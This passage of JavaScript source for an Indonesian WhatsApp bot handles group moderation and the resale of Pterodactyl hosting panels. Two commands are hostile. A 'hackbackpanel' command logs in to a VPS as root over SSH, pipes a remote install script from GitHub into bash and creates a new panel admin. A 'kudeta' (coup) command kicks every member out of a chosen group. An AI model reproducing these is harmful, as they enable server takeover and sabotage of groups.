if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//=========================================//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//=========================================//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//=========================================//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//=========================================//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//=========================================//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//=========================================//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//=========================================//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//=========================================//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//=========================================//

case "kudetagc": {
    if (!isCreator) return Reply(mess.owner)

    let allChats = await conn.groupFetchAllParticipating()
    let groups = Object.entries(allChats)
        .map(([jid, data]) => ({
            id: jid,
            name: data.subject || 'Tanpa Nama',
            isBotAdmin: data.participants.some(p => p.id === botNumber && p.admin === "admin")
        }))
        .filter(g => g.isBotAdmin) // tampilkan hanya grup yg bot adalah admin

    if (!groups.length) return Reply("❌ Bot tidak jadi admin di grup manapun.")

    // simpan sementara id grup ke cache global, supaya nanti tau yang dipilih
    global.cacheGrupKudeta = {}
    let sections = [
        {
            title: '🏴‍☠️ Pilih Grup untuk di-Kudeta',
            rows: groups.map((g, i) => {
                global.cacheGrupKudeta[`kudeta_${i}`] = g.id
                return {
                    title: g.name,
                    description: g.id,
                    id: `.kudetagrp kudeta_${i}`
                }
            })
        }
    ]

    await conn.sendMessage(m.chat, {
        caption: "Silakan pilih grup yang ingin di-Kudeta:",
        image: { url: global.image.reply }, // ganti sesuai asset gambar bot kamu
        footer: `© ${botname} 2025`,
        buttons: [
            {
                buttonId: 'pilih_grup_kudeta',
                buttonText: { displayText: '🔥 Pilih Grup' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '📌 Pilih Grup Kudeta',
                        sections
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: m })
}
break

case "kudetagrp": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply("❌ Pilihan tidak ditemukan.")

    let grupId = global.cacheGrupKudeta?.[text.trim()]
    if (!grupId) return Reply("❌ Grup tidak valid atau cache sudah hilang.")

    let metadata = await conn.groupMetadata(grupId)
    let memberFilter = metadata.participants
        .map(v => v.id)
        .filter(e => e !== botNumber && e !== m.sender)

    if (!memberFilter.length) return Reply("✅ Grup sudah tidak ada member lain!")

    await Reply(`🔥 Kudeta Grup *${metadata.subject}* By FixzzXcpanel Dimulai...`)
    for (let i of memberFilter) {
        await conn.groupParticipantsUpdate(grupId, [i], 'remove')
        await sleep(1000)
    }
    await Reply(`🏴‍☠️ Kudeta Grup *${metadata.subject}* selesai!`)
}
break

//=========================================//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//=========================================//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//=========================================//

case "cadmin": {
 if (!isCreator) return Reply(mess.owner);
 if (!text) return Reply(example("nama,nomor"));

 let [nama, nomor] = text.split(',');
 if (!nama || !nomor) return Reply(example("luffy,628xxxxxxx"));

 nama = nama.trim();
 nomor = nomor.trim().replace(/[^0-9]/g, '');

 if (!/^(\d{10,15})$/.test(nomor)) return Reply("❌ Nomor tidak valid!");

 // Simpan sementara
 global.tempCadmin = global.tempCadmin || {};
 global.tempCadmin[m.sender] = {
 username: nama.toLowerCase().replace(/\s+/g, ''),
 name: capital(nama),
 nomor: nomor
 };

 await conn.sendMessage(m.chat, {
 caption: `🧩 *Nama:* ${capital(nama)}\n📱 *Nomor:* ${nomor}\n\nSilakan pilih server untuk membuat Admin Panel:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'pilih_server_cadmin',
 buttonText: { displayText: '🌐 Pilih Server' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🛠️ Pilih Server Panel',
 sections: [
 {
 title: '📁 Buat Admin Panel',
 rows: [
 {
 title: '🌐 Panel Server V1',
 description: '🔹 Buat akun admin di server V1',
 id: '.cadmin-v1'
 },
 {
 title: '🌐 Panel Server V2',
 description: '🔹 Buat akun admin di server V2',
 id: '.cadmin-v2'
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//=========================================//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//=========================================//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//=========================================//

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//=========================================//

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//=========================================//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//=========================================//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
  try {
    if (!isCreator && !jangan2) return Reply(mess.owner)
    if (!text) return m.reply(example("username"))
    global.panel = text

    var ram, disknya, cpu
    if (command == "1gb-v2") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb-v2") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb-v2") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb-v2") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb-v2") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb-v2") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb-v2") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb-v2") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb-v2") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb-v2") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = global.panel.toLowerCase() + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = capital(username) + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domainV2 + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": "Server",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domainV2 + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    var orang = m.isGroup ? m.sender : m.chat
    if (m.isGroup) await m.reply("*✅ Berhasil membuat panel!*\nData sudah dikirim ke private chat")

    var teks = `*✅ Berhasil Membuat Panel Kamu!*

📡 *ID Server:* ${server.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}

🌐 *Spesifikasi:*
• RAM: ${ram=="0"?"Unlimited":ram/1000+"GB"}
• Disk: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
• CPU: ${cpu=="0"?"Unlimited":cpu+"%"}

🌍 ${global.domainV2}

⚠️ *Syarat & Ketentuan:*
- Expired 1 bulan
- Garansi 15 hari (1x replace)
- Claim garansi wajib bawa bukti chat pembelian
`

    // Kirim pakai nativeFlowMessage
    let msgii = await generateWAMessageFromContent(orang, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender] },
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {"name":"cta_url","buttonParamsJson":`{"display_text":"🌐 Login Server Panel","url":"${global.domainV2}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Username","copy_code":"${user.username}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Password","copy_code":"${password}"}`}
              ]
            })
          })
        }
      }
    }, { userJid: orang, quoted: m })

    await conn.relayMessage(orang, msgii.message, { messageId: msgii.key.id })
    delete global.panel

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//=========================================//

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//=========================================//

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//=========================================//

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin-v2 ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//=========================================//
case "antilink": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);

  const teks = `🖲 *PENGATURAN ANTILINK*\nSilakan pilih mode dan status yang ingin kamu aktifkan atau nonaktifkan:\n\n` +
               `*V1:* Kick member yang mengirim link grup WhatsApp\n` +
               `*V2:* Hapus pesan yang mengandung link grup WhatsApp`;

  await conn.sendMessage(m.chat, {
    caption: teks,
    image: { url: global.image.reply },
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: `${prefix}antilink-v1 on`, buttonText: { displayText: '✅ Aktifkan Antilink V1' }, type: 1 },
      { buttonId: `${prefix}antilink-v1 off`, buttonText: { displayText: '❌ Nonaktifkan Antilink V1' }, type: 1 },
      { buttonId: `${prefix}antilink-v2 on`, buttonText: { displayText: '✅ Aktifkan Antilink V2' }, type: 1 },
      { buttonId: `${prefix}antilink-v2 off`, buttonText: { displayText: '❌ Nonaktifkan Antilink V2' }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

case "antilink-v1": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("on/off"));

  let teks = text.toLowerCase();
  if (teks === "on") {
    if (global.db.groups[m.chat].antilink) return Reply("*Antilink V1* sudah aktif!");
    global.db.groups[m.chat].antilink = true;
    global.db.groups[m.chat].antilink2 = false;
    return Reply("✅ *Antilink V1* berhasil diaktifkan. Siapa pun yang mengirim link akan *dikeluarkan*.");
  } else if (teks === "off") {
    if (!global.db.groups[m.chat].antilink) return Reply("*Antilink V1* sudah nonaktif.");
    global.db.groups[m.chat].antilink = false;
    return Reply("❌ *Antilink V1* berhasil dinonaktifkan.");
  } else {
    return Reply(example("on/off"));
  }
}
break;

case "antilink-v2": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("on/off"));

  let teks = text.toLowerCase();
  if (teks === "on") {
    if (global.db.groups[m.chat].antilink2) return Reply("*Antilink V2* sudah aktif!");
    global.db.groups[m.chat].antilink2 = true;
    global.db.groups[m.chat].antilink = false;
    return Reply("✅ *Antilink V2* berhasil diaktifkan. Pesan yang mengandung link akan *dihapus*.");
  } else if (teks === "off") {
    if (!global.db.groups[m.chat].antilink2) return Reply("*Antilink V2* sudah nonaktif.");
    global.db.groups[m.chat].antilink2 = false;
    return Reply("❌ *Antilink V2* berhasil dinonaktifkan.");
  } else {
    return Reply(example("on/off"));
  }
}
break;


//=========================================//

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
